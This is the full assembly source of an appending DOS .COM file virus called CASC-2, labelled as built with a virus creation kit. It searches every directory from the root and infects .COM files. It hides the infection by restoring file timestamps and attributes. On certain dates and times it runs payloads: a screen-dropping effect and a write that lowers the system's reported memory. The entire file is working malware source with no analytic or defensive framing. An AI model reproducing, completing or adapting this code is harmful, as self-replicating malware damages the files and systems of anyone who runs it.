

; CASC-2.ASM
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Unknown User

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		
Row             dw      24

		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		call    search_files            ; Find and infect a file
		call    search_files            ; Find and infect another file
		call    get_hour
		cmp     ax,0017h                ; Did the function return 23?
		je      strt00                  ; If equal, do effect
		call    get_weekday
		cmp     ax,0005h                ; Did the function return 5?
		je      strt00                  ; If equal, do effect
		call    get_minute
		cmp     ax,003Bh                ; Did the function return 59?
		je      strt00                  ; If equal, do effect
		jmp     end00                   ; Otherwise skip over it
       
				   ;First, get current video mode and page.
strt00:        mov  cx,0B800h      ;color display, color video mem for page 1
	       mov  ah,15          ;Get current video mode
	       int  10h
	       cmp  al,2           ;Color?
	       je   A2             ;Yes
	       cmp  al,3           ;Color?
	       je   A2             ;Yes
	       cmp  al,7           ;Mono?
	       je   A1             ;Yes
	       int  20h            ;No,quit

				   ;here if 80 col text mode; put video segment in ds.
A1:            mov  cx,0A300h      ;Set for mono; mono videomem for page 1
A2:            mov  bl,0           ;bx=page offset
	       add  cx,bx          ;Video segment
	       mov  ds,cx          ;in ds

				   ;start dropsy effect
	       xor  bx,bx          ;Start at top left corner
A3:            push bx             ;Save row start on stack
	       mov  bp,80          ;Reset column counter
				   ;Do next column in a row.
A4:            mov  si,bx          ;Set row top in si
	       mov  ax,[si]        ;Get char & attr from screen
	       cmp  al,20h         ;Is it a blank?
	       je   A7             ;Yes, skip it
	       mov  dx,ax          ;No, save it in dx
	       mov  al,20h         ;Make it a space
	       mov  [si],ax        ;and put on screen
	       add  si,160         ;Set for next row
	       mov  di,cs:Row      ;Get rows remaining
A5:            mov  ax,[si]        ;Get the char & attr from screen
	       mov  [si],dx        ;Put top row char & attr there
A6:            call Vert           ;Wait for 2 vert retraces
	       mov  [si],ax        ;Put original char & attr back
				   ;Do next row, this column.
	      add  si,160          ;Next row
	      dec  di              ;Done all rows remaining?
	      jne  A5              ;No, do next one
	      mov  [si-160],dx     ;Put char & attr on line 25 as junk
				   ;Do next column on this row.
A7:           add  bx,2            ;Next column, same row
	      dec  bp              ;Dec column counter; done?
	      jne  A4              ;No, do this column
;Do next row.
A8:           pop  bx              ;Get current row start
	      add  bx,160          ;Next row
	      dec  cs:Row          ;All rows done?
	      jne  A3              ;No
A9:           mov  ax,4C00h  
	      int  21h             ;Yes, quit to DOS with error code

				   ;routine to deal with snow on CGA screen.
Vert:         push ax
	      push dx
	      push cx              ;Save all registers used
	      mov  cl,2            ;Wait for 2 vert retraces
	      mov  dx,3DAh         ;CRT status port
F1:           in   al,dx           ;Read status
	      test al,8            ;Vert retrace went hi?
	      je   F1              ;No, wait for it
	      dec  cl              ;2nd one?
	      je   F3              ;Yes, write during blanking time
F2:           in   al,dx           ;No, get status
	      test al,8            ;Vert retrace went low?
	      jne  F2              ;No, wait for it
	      jmp  F1              ;Yes, wait for next hi
F3:           pop  cx
	      pop  dx
	      pop  ax              ;Restore registers
	      ret
end00:          call    get_day
		cmp     ax,000Dh                ; Did the function return 13?
		je      strt01                  ; If equal, do effect
		call    get_weekday
		cmp     ax,0005h                ; Did the function return 5?
		je      strt01                  ; If equal, do effect
		call    get_second
		cmp     ax,000Ah                ; Did the function return 10?
		je      strt01                  ; If equal, do effect
		jmp     end01                   ; Otherwise skip over it
strt01:         mov     dx,00C8h                ; First argument is 200
		push    es                      ; Save ES
		mov     ax,040h                 ; Set extra segment to 040h
		mov     es,ax                   ; (ROM BIOS)
		mov     word ptr es:[013h],dx   ; Store new RAM ammount
		pop     es                      ; Restore ES

end01:
com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		lea     dx,[di + start]         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


get_day         proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dl                   ; Copy day into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_day         endp

get_hour        proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,ch                   ; Copy hour into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_hour        endp

get_minute      proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,cl                   ; Copy minute into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_minute      endp

get_second      proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,dh                   ; Copy second into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_second      endp

get_weekday     proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_weekday     endp

vcl_marker      db      "[VCL]",0               ; VCL creation marker

finish          label   near

code            ends
		end     main

